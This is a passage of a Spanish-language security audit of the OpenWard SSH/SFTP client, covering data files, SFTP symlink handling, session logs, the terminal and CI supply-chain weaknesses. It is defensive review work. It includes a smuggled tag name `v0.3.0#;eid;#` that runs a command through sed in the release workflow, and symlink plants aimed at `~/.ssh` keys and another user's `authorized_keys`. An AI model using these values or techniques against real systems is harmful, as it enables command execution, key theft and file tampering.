### DA-6 · Exportar una clave: los permisos van después y no se comprueban
- **Gravedad:** Baja · **Confianza:** Probable (falta ver si `File.copy` conserva el modo del origen)
- **Ubicación:** `app/lib/keys/key_actions.dart:43-48`.
- **Qué pasa:** `File(from).copy(to)` y después `Process.run('chmod', ['600', …])`, sin mirar el código de salida. Sobre un archivo que ya existía, la clave se escribe con sus permisos hasta el `chmod`; en FAT, exFAT o SMB el `chmod` falla en silencio y la app dice «exportada»; en Windows no se restringe la ACL.
- **Recomendación:** exportar desde el núcleo (temporal con `create_new` y 0600, y `rename`), y avisar si el destino no admite permisos.

### DA-7 · Leer un certificado sin comprobar que es un archivo, en el hilo de la interfaz
- **Gravedad:** Informativa · **Confianza:** Confirmado
- **Ubicación:** `core/crates/openward-app/src/keys.rs:82-91`; `core/crates/openward-ffi/src/api/identities.rs:242-285`; `app/lib/identities/identity_editor.dart:276`.
- **Qué pasa:** un `certificate_files` que apunta a `/dev/zero` o a una FIFO (desde `~/.ssh/config`) cuelga o agota la memoria al abrir Identidades; al conectar sí se comprueba (`connect.rs:544`).
- **Recomendación:** `openward_import::files::read` o lo mismo: archivo normal y con tope.
- **Relación:** DT-14.

### DA-8 · SECURITY.md: cierto para el vault, incompleto para la carpeta de datos
- **Gravedad:** Informativa · **Confianza:** Confirmado
- **Qué pasa:** el vault no tiene campo de contraseña y las claves van por su ruta (`openward-proto/src/settings.rs:154`), como dice. Pero la carpeta de datos guarda también el historial de comandos (activado de serie), las recientes y los registros de sesión; las claves traídas de Termius se escriben como estaban, sin frase si no la tenían (`programs.rs:851-855`); y el vault guarda lo que se escriba en snippets, notas, `env` y ProxyCommand.
- **Recomendación:** decirlo en SECURITY.md, con lo de DA-1.

### DA-9 · Nombres con `%` en `~/.ssh` se expanden como tokens
- **Gravedad:** Informativa · **Confianza:** Confirmado
- **Ubicación:** `core/crates/openward-app/src/keychain.rs:127-132,230-236`; `core/crates/openward-app/src/local.rs:65-79`.
- **Qué pasa:** un archivo llamado `%u`, creado fuera de OpenWard, se lista con ese nombre, pero borrarlo, renombrarlo o cambiarle la frase actúa sobre `~/.ssh/<usuario>`. No sale de `~/.ssh`.
- **Recomendación:** que esas tres acciones reciban el nombre del archivo, no una ruta con tokens.

## SF · SFTP y archivos locales

### SF-1 · La bajada sigue enlaces simbólicos locales que ya estaban (carpetas y `.part`)
- **Gravedad:** Media · **Confianza:** Confirmado
- **Ubicación:** `core/crates/openward-sftp/src/local.rs:37-43` (`stat` con `metadata`); `core/crates/openward-sftp/src/transfer.rs:1068-1076,1103-1111,1134-1151,1184-1197`; `transfer.rs:176-177`; `app/lib/sftp/dialogs.dart:40`.
- **Qué pasa:** el `rename` final sustituye un enlace en lugar de escribir a través de él, pero hay tres casos que sí lo atraviesan:
  - una carpeta del destino que es un enlace a otra cuenta como «ya existe» y todo se escribe donde apunta; el diálogo de conflicto la enseña como carpeta y propone mezclar;
  - el `.part` se abre con `create(true).write(true).truncate(false)`, sin `O_NOFOLLOW` ni `O_EXCL`: si es un enlace, se trunca (`set_len`) y se escribe su destino, y luego se le ponen permisos y fecha por ruta;
  - un `.part` que es un archivo normal de otro usuario, en 0666, se «reanuda»: los primeros bytes del archivo final son suyos y el archivo sigue siendo suyo.
- **Escenario:** otro usuario escribe en la carpeta a la que se baja (`/tmp` o `/Users/Shared` en macOS, una carpeta de grupo). Para el primer caso le basta saber el nombre de la carpeta; para los otros, la ruta remota, el tamaño y la fecha, porque el nombre del `.part` es un FNV-1a de 32 bits de esos datos, fácil si el archivo es suyo o lo comparte. Así crea o sobrescribe archivos del home de la víctima (en macOS, uno en `~/Library/LaunchAgents` da persistencia). En Linux, `fs.protected_symlinks` y `fs.protected_regular` lo paran en carpetas con sticky como `/tmp`; macOS no tiene nada parecido.
- **Recomendación:** el `.part` con `O_NOFOLLOW`, y `O_EXCL` si no se reanuda; al reanudar, `fstat` para ver que es un archivo normal y del usuario; permisos y fecha con `fchmod` y `futimens`; las carpetas con `symlink_metadata`, y un enlace rechazado o preguntado; mejor aún, recorrer el destino con descriptores (`openat` con `O_NOFOLLOW`). El diálogo de conflicto dice si algo es un enlace.
- **Relación:** DT-1 cubre el lado del servidor (`local_join`), no lo que ya hay en el disco; DT-2 identifica un `.part` propio solo por el nombre.

### SF-2 · Lo que se baja por un enlace toma el modo del enlace (DT-16 regresa)
- **Gravedad:** Baja · **Confianza:** Confirmado
- **Ubicación:** `core/crates/openward-sftp/src/remote.rs:181-187`; `core/crates/openward-sftp/src/transfer.rs:841-846,1147,1189-1192`.
- **Qué pasa:** `follow_links` copia `link_dir` y `size` del destino del enlace, pero no `mode`. El modo de un enlace es 0777, así que el archivo nace 0666 menos la umask y se le añade la ejecución: un `id_ed25519` en 0600 al que se llega por `secrets -> ../keys/id_ed25519` se baja en 0755, legible por los demás.
- **Recomendación:** `mode` (y la fecha) del `stat` en `follow_links`, o `source.mode` en `download`.

### SF-3 · El modo de las carpetas no se copia en ninguna dirección
- **Gravedad:** Baja · **Confianza:** Confirmado
- **Ubicación:** `transfer.rs:949,1073`; `remote.rs:232-233`.
- **Qué pasa:** una carpeta 0700 queda 0755 al otro lado, y sus archivos 0644, que eran privados por la carpeta, quedan legibles.
- **Recomendación:** crear las carpetas con el modo del origen, recortado como se hace con los archivos.

### SF-4 · La subida conserva setuid, setgid y sticky
- **Gravedad:** Baja · **Confianza:** Confirmado en el cliente; el efecto depende del `chmod` del servidor
- **Ubicación:** `core/crates/openward-sftp/src/transfer.rs:996-1001,1034`; `remote.rs:379,552`; `entry.rs:245`.
- **Qué pasa:** el modo va con `& 0o7777`: un archivo local con setuid llega así al servidor, y al reemplazar se queda el setuid del archivo de antes con el contenido nuevo. `sftp put` aplica `& 0777`.
- **Recomendación:** `& 0o777` en los nuevos y sin los bits especiales al reemplazar.

### SF-5 · Al subir una carpeta se sigue cualquier enlace a un archivo, también fuera de ella
- **Gravedad:** Baja · **Confianza:** Confirmado
- **Ubicación:** `core/crates/openward-sftp/src/local.rs:21-29,130-136`; `transfer.rs:953,1014`.
- **Qué pasa:** `config -> ~/.ssh/id_ed25519` dentro de una carpeta sube la clave; entre el recorrido y el `open` hay además una carrera si otros pueden escribir en la carpeta, y un enlace a una FIFO bloquea el trabajo sin poder cancelarlo.
- **Escenario:** el usuario descomprime algo que trae enlaces preparados y sube la carpeta a una ruta pública del servidor.
- **Recomendación:** no seguir los enlaces que salen de la carpeta subida (o preguntar enseñando a dónde llevan); abrir con `O_NOFOLLOW | O_NONBLOCK` y comprobar con `fstat` que es un archivo normal.

### SF-6 · Subir a un servidor Windows con `\` o `:` en los nombres locales
- **Gravedad:** Baja · **Confianza:** Probable (falta probarlo contra Win32-OpenSSH)
- **Ubicación:** `transfer.rs:734-735`; `core/crates/openward-sftp/src/lib.rs:96-98`.
- **Qué pasa:** en Linux y macOS, `..\..\x.bat` es un nombre válido; Win32-OpenSSH trata `\` como separador, y el archivo acabaría fuera del destino. Con `:`, un flujo alternativo (ADS).
- **Recomendación:** al subir, rechazar `\` y `:` (siempre, o cuando el servidor parezca Windows).

### SF-7 · En Windows, `local_join` acepta nombres reservados y finales en punto o espacio
- **Gravedad:** Baja · **Confianza:** Probable (falta probarlo en Windows)
- **Ubicación:** `transfer.rs:827-837`.
- **Qué pasa:** `CON`, `NUL`, `AUX`, `COM1`, `LPT1` (también con extensión, como `NUL.ow-….part`), `a.`, `a ` y `...` pasan: escribir en un dispositivo, dos nombres que acaban en el mismo archivo, o fallos. No sale de la carpeta.
- **Recomendación:** rechazarlos o cambiarlos en Windows, como ya se hace con `\` y `:`.

### SF-8 · Lo bajado no lleva marca de origen
- **Gravedad:** Baja · **Confianza:** Confirmado
- **Ubicación:** `app/macos/Runner/Info.plist` (sin `LSFileQuarantineEnabled`); `transfer.rs:1189-1192`.
- **Qué pasa:** la app nunca abre lo que baja (el doble clic copia), pero un `.command`, una `.app` o un `.exe` abierto luego desde el Finder o el Explorador no pasa por Gatekeeper ni SmartScreen, y conserva el bit de ejecución del servidor. Los nombres con bidi (U+202E) o controles se enseñan tal cual.
- **Recomendación:** la cuarentena en macOS (la clave del plist o `com.apple.quarantine`) y Mark-of-the-Web en Windows; los bidi y controles de los nombres, a la vista.

### SF-9 · El diálogo de permisos quita los bits especiales y, sobre un enlace, parte de 0777
- **Gravedad:** Baja · **Confianza:** Confirmado
- **Ubicación:** `app/lib/sftp/dialogs.dart:358,368`; `app/lib/sftp/sftp_view.dart:409-415`; `remote.rs:328-334`; `local.rs:85-86`.
- **Qué pasa:** aplicar permisos a una carpeta 1777 o 2775 quita el sticky o el setgid (también en recursivo): en una carpeta compartida, cualquiera podría borrar archivos ajenos. Sobre un enlace, el diálogo empieza en el modo del enlace y lo aplica al destino: quitar una casilla deja el destino escribible por todos.
- **Recomendación:** conservar los bits especiales; para un enlace, el modo del destino o el diálogo desactivado.

### SF-10 · Borrar o cambiar permisos en recursivo puede seguir un enlace que aparece a mitad
- **Gravedad:** Baja · **Confianza:** Probable (carrera no reproducida)
- **Ubicación:** `core/crates/openward-sftp/src/remote.rs:309-324,341-361`.
- **Qué pasa:** entre el `lstat` y el `opendir` de una subcarpeta hay una ida y vuelta; otro usuario del servidor que puede escribir en el árbol la cambia por un enlace, y el borrado o el `chmod` siguen en el destino (el home de la víctima). En local, `remove_dir_all` es seguro.
- **Recomendación:** volver a comprobar con `lstat` lo que da `realpath`; `lsetstat@openssh.com` si el servidor lo ofrece.

### SF-11 · Sin límites ante un servidor hostil: listados, profundidad, tamaño
- **Gravedad:** Baja (la app se cae) · **Confianza:** Confirmado en el código; el efecto no se ha medido
- **Ubicación:** `remote.rs:120-146,314,336,409-467`; `core/crates/openward-sftp/src/pipe.rs:337`.
- **Qué pasa:** un listado sin fin llena la memoria y no se puede cancelar; un árbol sin fondo, al borrarlo o en un `chmod` recursivo, anida futuros hasta desbordar la pila (aborta el proceso, con todas las sesiones); un archivo listado con 1 KB puede mandar lo que quiera hasta llenar el disco; la suma de tamaños en `u64` da la vuelta.
- **Recomendación:** topes como los de DT-14 (niveles y entradas); borrado y `chmod` iterativos; la bajada cortada en el tamaño listado, o preguntar; `saturating_add`.

### SF-12 · Informativos del SFTP y el terminal local
- **Gravedad:** Informativa
- Subir sobre un enlace del servidor escribe donde apunta sin decirlo (`transfer.rs:968-987`): es lo que decidió DT-8 y lo que hace `sftp`, pero en una carpeta compartida otro usuario puede dejar `informe.pdf -> ~victima/.ssh/authorized_keys`. Conviene enseñar el enlace y a dónde lleva.
- `install_public_key` sustituye `authorized_keys` aunque sea un enlace (`core/crates/openward-app/src/sftp.rs:161-163`): pasa a ser un archivo normal.
- `portable-pty` 0.9.0 reserva memoria en `pre_exec` (`close_random_fds` con `read_dir` después del `fork`), que no es seguro en un proceso con hilos; con glibc y macOS suele ir bien. `close_range` o `closefrom` si se hace fork del crate.

## RG · Registros de sesión e historial

### RG-1 · Un espacio delante no evita guardar el comando si la línea se editó
- **Gravedad:** Baja · **Confianza:** Confirmado
- **Ubicación:** `app/lib/history/line_tracker.dart:120,126-128,138-144`; `app/lib/l10n/app_es.arb:440`; `app/test/history_test.dart:98-101`.
- **Qué pasa:** el espacio inicial solo se mira si la línea no se editó; tras Tab o una flecha, el comando es el texto de la pantalla ya recortado. Va al historial (activado de serie) y como marcador `$ …` al `.cast`. La interfaz promete «Nunca se guarda… lo que empieza por un espacio», y las pruebas solo cubren el caso sin edición.
- **Escenario:** ` mysql -uroot -pS3cret db<Tab>` queda en `history.json`, que además puede ser legible por otros (DA-1).
- **Recomendación:** comprobar `_typed.startsWith(' ')` también en la rama editada, y una prueba.

### RG-2 · La pausa no lo cubre todo
- **Gravedad:** Baja · **Confianza:** Confirmado el marcador; Probable lo demás (comportamiento conocido de tmux, no ejecutado)
- **Ubicación:** `core/crates/openward-app/src/logs/recorder.rs:119-124,168-176`; `app/lib/terminal/terminal_pane.dart:318-320`; `core/crates/openward-app/src/lib.rs:164-168`.
- **Qué pasa:** la pausa solo se mira al pulsar Intro, así que un comando empezado en pausa y terminado grabando se guarda entero como marcador; lo que salió en pausa y sigue en pantalla se graba si el programa lo redibuja después (tmux al cambiar de tamaño, less, vim); reconectar a mano empieza un registro sin pausa, y tmux redibuja al engancharse.
- **Escenario:** en pausa, `cat .env` en una sesión tmux; se sigue grabando y se cambia el tamaño de la ventana: el `.env` queda en el `.cast`, aunque la interfaz dice «Lo que salga mientras, no se guarda».
- **Recomendación:** descartar el marcador si hubo pausa desde que empezó la línea; decir lo de los redibujados en la ayuda de la pausa; heredar la pausa al reconectar a mano, o avisar.

### RG-3 · Un servidor puede hacer que la retención borre los demás registros
- **Gravedad:** Baja · **Confianza:** Confirmado en el código; tamaños estimados
- **Ubicación:** `core/crates/openward-app/src/logs/mod.rs:489-526,753-761`; `recorder.rs:32`.
- **Qué pasa:** el tope por sesión (1 GiB) se mide antes de comprimir y no tiene que ver con el límite de espacio (2 GB de serie). Una sesión de texto al azar deja cerca de 0,8 GiB de `.cast.gz` y otro tanto de `.txt.gz`; al cerrarse, `prune` borra empezando por los más antiguos hasta caber: el historial grabado sin guardar de los demás hosts. Varias pestañas lo multiplican.
- **Escenario:** un servidor comprometido borra el rastro de las sesiones anteriores en otros hosts, justo lo que el registro debía conservar para el informe de una incidencia.
- **Recomendación:** un tope en disco por sesión, como fracción del límite; al podar, primero la sesión que lo desbordó.

### RG-4 · Abrir, exportar o copiar un registro lo carga entero en memoria
- **Gravedad:** Baja (la app se cae) · **Confianza:** Confirmado el camino y la expansión ×6 (prueba ejecutada); Probable el aborto
- **Ubicación:** `core/crates/openward-app/src/logs/mod.rs:595-622,703-738`; `core/crates/openward-app/src/logs/cast.rs:263-286,291-334`.
- **Qué pasa:** un servidor manda 1 GiB de `\x01`, que no se ve y se comprime muchísimo. Exportar a `.cast` reserva unos 6 GiB (cada byte de control se escribe como `\u00XX`) y, si la reserva falla, Rust aborta el proceso; abrir el visor carga más de 1 GiB, y «Copiar como texto» lo lleva a Dart y al portapapeles.
- **Recomendación:** exportar línea a línea, sin cargar el archivo; leer la reproducción por tramos o con tope; avisar antes de copiar un texto grande.

### RG-5 · Las entradas de sesión se guardan siempre, también con «Conexiones recientes» apagado
- **Gravedad:** Baja · **Confianza:** Confirmado
- **Ubicación:** `core/crates/openward-app/src/logs/mod.rs:352-400`; `logs/sink.rs:61-83`; `core/crates/openward-app/src/lib.rs:387-436,521-536`; `app/lib/home/recent.dart:139-140,191-195`; `app/lib/l10n/app_es.arb:3051`.
- **Qué pasa:** sin grabar y con las recientes apagadas, cada sesión deja dónde (`usuario@host:puerto`), cuándo, cuánto y cómo acabó, durante 30 días o para siempre, también las de terminales locales (la ayuda de recientes dice «Los terminales locales no»), y «Borrar» en las recientes no las toca. No hay forma de desactivarlas.
- **Recomendación:** que «Conexiones recientes» apagado, o un interruptor propio, evite las entradas sin grabación; o decirlo junto al interruptor y en «Borrar».

### RG-6 · El texto para buscar y exportar no es fiel ante un servidor hostil
- **Gravedad:** Baja · **Confianza:** Confirmado el filtro (prueba ejecutada); Probable el efecto visual
- **Ubicación:** `core/crates/openward-app/src/logs/text.rs:255-259,276`; `app/lib/logs/logs_page.dart:671-675,861-867,906-913`.
- **Qué pasa:** las secuencias OSC, DCS y APC solo terminan con BEL o ESC; Ghostty las cancela también con CAN y SUB. Tras `ESC ] 0 ; x CAN`, el `.txt.gz`, la búsqueda, «Exportar .txt» y «Copiar» pierden todo hasta el siguiente BEL o ESC, aunque se viera en pantalla. Además U+202E, U+2066–2069 y U+200B pasan tal cual y se pintan con bidi en la vista previa, los resultados y la lista de comandos.
- **Escenario:** un servidor esconde de la búsqueda lo que enseñó, o hace que un comando se lea al revés en la lista.
- **Recomendación:** CAN y SUB como fin de secuencia en `TextFilter`; los bidi y de ancho cero a la vista, como en el pegado (TM-14).

### RG-7 · Lo que el historial guarda tras editar lo decide la pantalla, y se reenvía sin mirar
- **Gravedad:** Baja · **Confianza:** Confirmado el camino; el escenario pide varias acciones del usuario
- **Ubicación:** `app/lib/history/line_tracker.dart:138-144`; `core/crates/openward-ghostty/src/engine.rs:1059-1088`; `app/lib/palette/command_palette.dart:257-266,918-934`.
- **Qué pasa:** tras una flecha o Tab, el comando guardado es lo que dibuja la shell, hasta 4000 caracteres y con las celdas invisibles; desde ⌘K se manda con `session.text`, sin la comprobación de invisibles del pegado.
- **Escenario:** el usuario pulsa ↑ en un host hostil, que dibuja una línea inocente con texto en el color del fondo en las filas siguientes; Intro. Días después la lanza desde ⌘K en otro host, el de la pestaña de delante, y se manda lo escondido.
- **Recomendación:** al relanzar desde el historial, la misma comprobación que el pegado, y marcar las entradas que vienen de otro host.

### RG-8 · «Borrar todos» y la retención dejan archivos huérfanos
- **Gravedad:** Baja · **Confianza:** Confirmado
- **Ubicación:** `core/crates/openward-app/src/logs/mod.rs:249-257,372-388,450-470,770`.
- **Qué pasa:** solo se borra lo que está en el mapa en memoria. Quedan para siempre, sin contar ni caducar: un `.cast.gz` o `.txt.gz` cuyo `.json` no se lee (por ejemplo tras volver a una versión anterior con un valor nuevo), lo que deja un `begin` fallido y los `.tmp` de un cierre brusco. «Borrar todos… también los guardados» da a entender lo contrario.
- **Recomendación:** barrer también lo que coincida con `<uuid>.(cast.gz|txt.gz|json.tmp)` sin entrada válida, y admitir valores desconocidos en `Entry`, como el vault con `Unsupported`.

### RG-9 · Informativos de los registros y el historial
- **Gravedad:** Informativa
- Un `.cast` manipulado provoca pánicos en el reproductor (`player.rs:98`: `clamp` con un último tiempo negativo; `cast.rs:340-343` acepta 0×0 o 65535×65535). Hace falta escribir en `logs/` (0700, carpeta fija) y flutter_rust_bridge captura el pánico; conviene validar la cabecera y los eventos al leer.
- «No guardar registros de web-1…» desde el chip no para la grabación en curso (`lib.rs:387-436`, `log_chip.dart:263-295`): ofrecer pausarla o terminarla.
- Exportar con `mode(0o600)` solo vale al crear: sobre un archivo que ya existía se conservan sus permisos y se sigue el enlace (`mod.rs:205-214`); `export_text` trunca el destino antes de comprobar el id (`mod.rs:609`). El destino lo elige el usuario, así que no hay ataque.
- El `.cast` exportado lleva las secuencias crudas del servidor, que se interpretan otra vez en el terminal de quien lo reproduzca con `asciinema play` o `cat` (OSC 52, 1337…). «Copiar como texto» deja en el portapapeles todo lo visto, sin avisar.
- El chip dice «nunca lo que escribes», pero el eco del servidor sí queda; el historial guarda cualquier comando visible, sin un filtro tipo `HISTIGNORE`; y el `.cast` guarda el tiempo de cada evento en microsegundos, así que con `pwfeedback` (asteriscos) queda el ritmo con que se tecleó una contraseña.

## TE · Terminal

### TE-1 · La vista previa del pegado se corta a 400 caracteres sin decir cuánto falta (TM-14 incompleto)
- **Gravedad:** Baja · **Confianza:** Confirmado
- **Ubicación:** `app/lib/terminal/paste.dart:13-14,40,94`.
- **Qué pasa:** en un pegado de varias líneas (el portapapeles envenenado de una web), lo que pasa de 400 caracteres (600 en varios paneles) no se ve: solo «…», sin contar líneas. El aviso de invisibles mira el texto entero pero no dice dónde están, y `visibleForm` no marca los caracteres de etiqueta (U+E0000–E007F), U+2028/2029, U+00AD ni los selectores de variante.
- **Recomendación:** el texto entero con desplazamiento, o «y N líneas más», y la lista de invisibles ampliada.

### TE-2 · El aviso de pegado de varias líneas depende del modo 2004
- **Gravedad:** Informativa · **Confianza:** Confirmado
- **Ubicación:** `app/lib/terminal/terminal_pane.dart:508`.
- **Qué pasa:** `\e[?2004h` en cualquier cosa que se muestre (un `cat`) activa el pegado entre corchetes; en una shell que no lo usa (dash, python, bash sin readline), un pegado de varias líneas entra sin preguntar y se ejecuta línea a línea. Ghostty e iTerm2 hacen lo mismo.
- **Recomendación:** una opción «preguntar siempre con varias líneas».

### TE-3 · Enlaces: `ftp` y `mailto` en la lista, y el destino en crudo
- **Gravedad:** Informativa · **Confianza:** Confirmado
- **Ubicación:** `app/lib/terminal/links.dart:16,25-37,66`.
- **Qué pasa:** la lista es de permitidos, bien, pero `mailto:` con `?attach=` adjunta archivos locales en algunos clientes de Linux, y `ftp:` lo montan el Finder o Nautilus. El destino se enseña tal cual: sin punycode (un homógrafo «аpple.com» parece legítimo) y sin marcar bidi ni invisibles; `linkMisleads` no avisa si el texto lleva espacios («Entra en bank.com»).
- **Recomendación:** quitar `ftp` y limpiar los parámetros de `mailto`; el host en punycode; `visibleText` sobre el destino; buscar el host en el texto aunque tenga espacios.

### TE-4 · Superficie del motor que no se usa
- **Gravedad:** Informativa · **Confianza:** Probable (leído en Ghostty, no medido)
- **Ubicación:** `core/crates/openward-ghostty/src/engine.rs:71-81,255-395`.
- **Qué pasa:** el protocolo de imágenes de Kitty está activo (10 MB guardados por pantalla, hasta 400 MB transitorios por imagen descomprimida) aunque OpenWard no pinta imágenes; XTVERSION responde a cualquier servidor con la versión exacta («OpenWard 0.3.3-beta.2»).
- **Recomendación:** `GHOSTTY_TERMINAL_OPT_KITTY_IMAGE_STORAGE_LIMIT = 0`, y valorar si hace falta dar la versión entera.

### TE-5 · Importar un tema de iTerm2 puede congelar la interfaz
- **Gravedad:** Informativa · **Confianza:** Probable (sin Dart para probarlo)
- **Ubicación:** `app/lib/terminal/scheme_import.dart:36-40`; `app/lib/settings/appearance_page.dart:591-592`.
- **Qué pasa:** `<dict>(.*?)</dict>` con `dotAll`, por cada clave y en el hilo de la interfaz: un `.itermcolors` con el prefijo de una clave repetido y sin `</dict>` hace la búsqueda cuadrática.
- **Recomendación:** un parser de plist, o en un isolate.

## CI · Build, CI y cadena de suministro

### CI-1 · Los paquetes de Linux se construyen con un Zig sin verificar
- **Gravedad:** Media · **Confianza:** Confirmado (falta la verificación; aprovecharlo pide comprometer el origen o el canal)
- **Ubicación:** `app/tool/linux/Containerfile:4,15,18-20,22,29`; `app/tool/package-linux.sh:112-113`.
- **Qué pasa:** los `.tar.gz` de Linux de las releases salen de `make package-linux`, no de la CI. En esa ruta, el Zig que compila `libghostty-vt` se baja con `curl | tar` sin SHA-256 (`install-zig.sh` sí lo comprueba, pero solo lo usa la CI); rustup llega por `curl | sh`, la imagen base por un tag que puede cambiar (`ubuntu:24.04`) y Flutter por `--branch` sin comprobar el commit. La auditoría anterior decía «Zig verificado por SHA-256», que solo es cierto en la CI.
- **Escenario:** un Zig manipulado (en el origen, en su CDN o en el camino) mete código en `libghostty-vt.a`, que va enlazada en la librería que reciben los usuarios. Nada lo detectaría.
- **Recomendación:** la tabla de SHA-256 de `install-zig.sh` también aquí, con aarch64-linux; `FROM ubuntu:24.04@sha256:…`; `rustup-init` verificado por hash; el commit de Flutter comprobado tras el clon; la imagen reconstruida con `--pull` en cada release.
- **Relación:** BR-10.

### CI-2 · La puerta local ejecuta el código de PRs externos en la máquina que publica
- **Gravedad:** Media · **Confianza:** Probable (depende de cómo se lleven los PRs externos tras publicar)
- **Ubicación:** `tool/ci.sh:2-4`; `CONTRIBUTING.md:21`; `.github/pull_request_template.md:11`.
- **Qué pasa:** «Nada llega a `main` sin `make ci` en verde», y `make ci` corre en local. Con el repositorio público, eso es ejecutar el código de un fork (`build.rs`, proc-macros, pruebas, `build-libghostty.sh`, los Containerfiles, el build tool de cargokit) en el Mac del mantenedor, que tiene `~/.ssh`, el llavero, `gh` con permiso de push al tap y las cachés de la build de release (CI-6).
- **Escenario:** un PR inocente en apariencia cambia un `build.rs`; al lanzar `make ci` para marcar la casilla, roba credenciales o envenena las cachés que luego usa `package-macos.sh`.
- **Recomendación:** la puerta de los PRs de fuera en GitHub Actions, con «Require approval for all outside collaborators»; nunca código externo sin revisar en la máquina de release (una VM o un usuario aparte si hace falta); CONTRIBUTING y `tool/ci.sh` al día.

### CI-3 · El canal de seguridad no funciona para alguien de fuera (BR-7 sigue abierto)
- **Gravedad:** Baja · **Confianza:** Confirmado el texto; Probable el ajuste futuro
- **Ubicación:** `SECURITY.md:7`; `docs/plan/auditoria-0.3.md:108`.
- **Qué pasa:** el único canal es el reporte privado de vulnerabilidades de este repositorio, que hoy es privado y no lo tiene activado; al hacerlo público no se activa solo. No hay correo de seguridad en ningún sitio, y los binarios ya son públicos en el tap.
- **Recomendación:** activar el reporte privado el mismo día; un correo alternativo (y si se quiere, PGP); enlazar SECURITY.md desde el README del tap.

### CI-4 · Inyección de órdenes en `release` por el nombre del tag
- **Gravedad:** Baja (pide permiso de escritura) · **Confianza:** Confirmado (reproducido)
- **Ubicación:** `.github/workflows/ci.yml:351,355-361`.
- **Qué pasa:** `TAG` va dentro del programa de `sed` (`s#…/blob/$TAG/docs/#g`). `#` y `;` son válidos en un nombre de ref: `v0.3.0#;eid;#` pasa `git check-ref-format`, cierra la sustitución y añade el comando `e` de GNU sed, que ejecuta `id`; `cut -d. -f1-2` da `0.3` y la comprobación de notas pasa. En ese momento el job tiene `GH_TOKEN` con `contents: write`.
- **Escenario:** una escalada si algún día se restringe quién toca `.github/workflows` pero no quién crea tags.
- **Recomendación:** validar `TAG` con la expresión de `tool/bump-version.sh:25` y no meterlo en el programa de `sed` (la expansión de bash o `awk -v`).

### CI-5 · El borrador de release no exige el resto de la CI ni que el tag esté en `main`
- **Gravedad:** Baja · **Confianza:** Confirmado el workflow; Probable lo de `actions: read`
- **Ubicación:** `.github/workflows/ci.yml:341-347`.
- **Qué pasa:** `needs: app` solo: un borrador sale con `deny`, `core` o `ssh` en rojo; no se comprueba que el commit del tag sea de `main`; no hay `environment` con revisores, ni reglas que limiten quién crea tags `v*`. `actions/checkout` deja el token de escritura en `.git/config`. Y con `permissions: contents: write`, el token no tiene `actions: read`, que `gh run download` necesita: el job probablemente falla la primera vez que corra.
- **Recomendación:** `needs: [core, deny, ssh, app, mobile-check]`; `git merge-base --is-ancestor "$GITHUB_SHA" origin/main`; `environment: release`; un ruleset para los tags `v*` y para `main` al publicar; `actions: read`; `persist-credentials: false`.

### CI-6 · Cachés persistentes compartidas entre builds de confianza y de no confianza
- **Gravedad:** Baja · **Confianza:** Confirmado el mecanismo; el escenario pide construir un árbol no fiable
- **Ubicación:** `app/tool/package-linux.sh:128-129`; `core/crates/openward-ghostty/build-libghostty.sh:62,67-73`; `core/crates/openward-ghostty/build.rs:50-56`; `.github/workflows/ci.yml:38,186`.
- **Qué pasa:** `.build-key` es un SHA-256 de valores públicos (versión de Zig, flags, el script), no un MAC, y la ruta usa los 8 primeros caracteres del commit. Cargo confía en `registry/src` ya extraído y Zig en `~/.cache/zig/p/<hash>` sin recalcular. Los volúmenes de `package-linux.sh` se comparten entre builds. Un árbol no fiable construido con `make package-linux` puede dejar un `libghostty-vt.a` con la `.build-key` correcta, o tocar fuentes de crates, y la build del tag siguiente lo reutiliza. En Actions lo protege el aislamiento por rama.
- **Recomendación:** volúmenes efímeros o por tag para las builds de release; el commit entero en `.build-key`; esos datos en la clave de `actions/cache`; `save-if` en `Swatinem/rust-cache` solo para `main`.
- **Relación:** BR-12 cumple su objetivo (no reutilizar una librería vieja), pero no da integridad.

### CI-7 · El build tool de cargokit resuelve sus dependencias sin lockfile
- **Gravedad:** Baja · **Confianza:** Confirmado el mecanismo
- **Ubicación:** `app/rust_builder/cargokit/run_build_tool.sh:23-34,73-78`; `app/rust_builder/cargokit/build_tool/pubspec.yaml:14-29`.
- **Qué pasa:** en cada build limpia se crea un paquete en un temporal, sin `pubspec.lock`, y se lanza `dart pub get`: las directas están fijadas, pero las transitivas flotan en su rango. `build_tool/pubspec.lock` no se usa, y ni dependabot ni `cargo deny` lo cubren.
- **Escenario:** una versión nueva y maliciosa de una transitiva corre durante `flutter build macos --release`.
- **Recomendación:** un lock del runner en el repositorio, copiado por `run_build_tool.sh`, y `dart pub get --enforce-lockfile`.

### CI-8 · `build_pod.sh` vuelca todo el entorno en el log
- **Gravedad:** Baja · **Confianza:** Confirmado
- **Ubicación:** `app/rust_builder/cargokit/build_pod.sh:14`.
- **Qué pasa:** un `env` heredado de cargokit. Hoy no hay secretos en la CI, pero con la firma y la notarización las contraseñas del certificado o del Apple ID irían a los logs de Xcode y de Actions (que enmascaran el valor exacto, no lo derivado); en local ya imprime `GH_TOKEN` o `HOMEBREW_GITHUB_API_TOKEN` en DerivedData.
- **Recomendación:** quitarlo, como los otros parches locales a cargokit.

### CI-9 · `crypto-bigint` 0.7.6 está *yanked* y `cargo deny` falla
- **Gravedad:** Baja · **Confianza:** Confirmado (`cargo audit` y el índice de crates.io)
- **Ubicación:** `core/Cargo.lock:569-572`; `core/deny.toml` (`yanked = "deny"`).
- **Qué pasa:** la 0.7.6, que llegó con R5 por RUSTSEC-2026-0387, está retirada, igual que la 0.7.7 y la 0.7.8. La política de `deny.toml` hace fallar la puerta, que es lo que BR-1 quería evitar.
- **Recomendación:** `cargo update -p crypto-bigint` (0.7.9 o 0.7.10) y `make deny`.

### CI-10 · Los PRs de forks producen artefactos con nombre de release
- **Gravedad:** Baja · **Confianza:** Confirmado
- **Ubicación:** `.github/workflows/ci.yml:12,292-320`.
- **Qué pasa:** con el repositorio público, cualquier PR de un fork deja `OpenWard-<versión>-linux-x64.tar.gz` en un artefacto `OpenWard-Linux` de una ejecución de `KaiCorpLabs/openward`: un buen gancho para «descarga la build arreglada de este run».
- **Recomendación:** no empaquetar en `pull_request`, o nombrar `pr-<n>-…` y bajar la retención.

### CI-11 · Los paquetes de Linux no tienen las garantías de BR-4 ni sumas
- **Gravedad:** Baja · **Confianza:** Confirmado
- **Ubicación:** `app/tool/package-linux.sh:115-120,136-139`.
- **Qué pasa:** un árbol sucio o fuera del tag solo cambia de nombre (`+commit-dirty`), no se rechaza; no hay `.commit` ni sha256 junto al paquete; las releases no llevan `SHA256SUMS` ni atestación de procedencia.
- **Recomendación:** las comprobaciones de `package-macos.sh:33-46`, un `SHA256SUMS` por release y `actions/attest-build-provenance` cuando los construya la CI.
